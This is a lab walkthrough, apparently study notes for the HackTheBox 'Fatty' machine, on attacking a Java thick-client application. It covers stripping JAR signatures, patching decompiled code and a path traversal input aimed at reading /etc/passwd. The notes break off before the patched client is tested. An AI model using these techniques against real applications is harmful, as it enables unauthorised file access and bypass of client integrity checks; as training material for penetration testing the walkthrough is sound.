# Exploiting Web Vulnerabilities in Thick-Client Applications

2-tier architecture :
Application is installed locally on the computer and communicates directly with the database.

3-tier architecture :
Application is installed locally on the computer, but in order to interact with the databases, they first communicate with an application server, usually using the HTTP/HTTPS protocol.

Security Advantage of 3-tier architecture : 
It prevents the end-user from communicating directly with the database server

Security Disadvantage of 3-tier architecture : 
It can be susceptible to web-specific attacks like SQL Injection and Path Traversal

## Scenario

We have found these files by enumerating FTP server that provides anonymous access :
fatty-client.jar
note.txt
note2.txt
note3.txt

Reading the content of all the text files reveals that:

- A server has been reconfigured to run on port 1337 instead of 8000.
- This might be a thick/thin client architecture where the client application still needs to be updated to use the new port.
- The client application relies on Java 8.
- The login credentials for login in the client application are qtc / clarabibi.

1) Try to connect to server using credentials

--> Failed : Connection Error! 

2) Try while analyzing the traffic with Wireshark

The client attempts to connect to the server.fatty.htb subdomain

3) Add subdomain to hosts file

echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts

Inspecting the traffic again reveals that the client is attempting to connect to port 8000.

4) Extract the content of fatty-client.jar

5) Run PowerShell as administrator and use Select-String to search all the files for port 8000

ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List

Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml
LineNumber : 13

6) Edit the content of the file to set the port 1337

cat fatty-client\beans.xml

<SNIP>
<!-- Here we have an constructor based injection, where Spring injects required arguments inside the
         constructor function. -->
   <bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
      <constructor-arg index="0" value = "server.fatty.htb"/>
      <constructor-arg index="1" value = "8000"/>
   </bean>

<!-- The next to beans use setter injection. For this kind of injection one needs to define an default
constructor for the object (no arguments) and one needs to define setter methods for the properties. -->
   <bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty">
      <property name = "keystorePath" value = "fatty.p12"/>
   </bean>

   <bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder">
      <property name = "secret" value = "clarabibiclarabibiclarabibi"/>
   </bean>
<SNIP>

--> The JAR is signed, validating every file's SHA-256 hashes before running. These hashes are present in the file META-INF/MANIFEST.MF

7) Remove the hashes from META-INF/MANIFEST.MF and delete the 1.RSA and 1.SF files from the META-INF directory.

--> The modified MANIFEST.MF should end with a new line

cat fatty-client\META-INF\MANIFEST.MF

Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter

Name: META-INF/maven/org.slf4j/slf4j-log4j12/pom.properties
SHA-256-Digest: miPHJ+Y50c4aqIcmsko7Z/hdj03XNhHx3C/pZbEp4Cw=

Name: org/springframework/jmx/export/metadata/ManagedOperationParamete
 r.class
SHA-256-Digest: h+JmFJqj0MnFbvd+LoFffOtcKcpbf/FD9h2AMOntcgw=
<SNIP>

Modify to :
Manifest-Version: 1.0
Archiver-Version: Plexus Archiver
Built-By: root
Sealed: True
Created-By: Apache Maven 3.3.9
Build-Jdk: 1.8.0_232
Main-Class: htb.fatty.client.run.Starter



8) Update and run the fatty-client.jar

cd .\fatty-client
jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *

9) Double-click on the fatty-client-new.jar file to start it and try logging in using the credentials qtc / clarabibi

--> Login Successful!

10) Foothold

Clicking on Profile -> Whoami reveals that the user qtc is assigned with the user role.
Username : qtc
Rolename : user

Clicking on the ServerStatus : we can't click on any options.

--> There might be another user with higher privileges that is allowed to use this feature

Clicking on the FileBrowser -> Notes.txt reveals the file security.txt > Open

--> This note informs us that a few critical issues in the application still need to be fixed

Navigating to the FileBrowser -> Mail option reveals the dave.txt file containing interesting information

It says that all admin users are removed from the database
It also refers to a timeout implemented in the login procedure to mitigate time-based SQL injection attacks

11) Path Traversal

../../../../../../etc/passwd > Open

The server filters out the / character from the input

Decompile code using  JD-GUI : http://java-decompiler.github.io/

Dragging and dropping the fatty-client-new.jar onto the jd-gui
Save All Sources option in jdgui
Decompress the fatty-client-new.jar.src.zip by right-clicking and selecting Extract files

fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java
if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "files");
    this.action.addArgument(folder);
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();

The showFiles function takes in one argument for the folder name and then sends the data to the server using the sendAndRecv() call

The file fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java
configs.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            ClientGuiTest.this.currentFolder = "configs";
            try {
              response = ClientGuiTest.this.invoker.showFiles("configs");
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });

--> We can replace the configs folder name with .. as follows.

ClientGuiTest.this.currentFolder = "..";
  try {
    response = ClientGuiTest.this.invoker.showFiles("..");

Compile :
javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java

mkdir raw
cp fatty-client-new.jar raw\fatty-client-new-2.jar

mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\

cd raw
jar -cmf META-INF\MANIFEST.MF traverse.jar .

Let's log in to the application and navigate to FileBrowser -> Config option

